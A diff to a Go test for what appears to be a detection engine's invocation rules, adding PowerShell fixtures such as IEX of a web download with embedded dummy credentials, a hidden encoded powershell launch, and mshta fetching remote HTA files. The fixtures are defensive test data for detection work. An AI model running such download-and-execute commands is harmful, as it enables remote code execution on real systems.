@@ -129,6 +129,9 @@ func TestInvocationRulesDeterministicAndFiltered(t *testing.T) {
 		{ID: "c", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: `IEX ([Convert]::FromBase64String($value))`},
 		taskEvent("d", "ActionReview", "alice", `mshta.exe https://203.0.113.8/a.hta`, "mshta.exe"),
 		taskEvent("e", "ActionReview", "alice", `mshta.exe https://203.0.113.9/a.hta`, "mshta.exe"),
+		{ID: "expression", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: `Write-Output "$(IEX $s)"`},
+		{ID: "expression-host", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: `Write-Output "$(powershell.exe -w hidden -enc AAAA)"`},
+		{ID: "userinfo", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: `IEX (iwr "https://alice:Dummy'Secret42@host01/a")`},
 		{ID: "unrelated", CaseID: "c", EventType: model.EventLogonSuccess},
 	}
 	rng := rand.New(rand.NewSource(1))
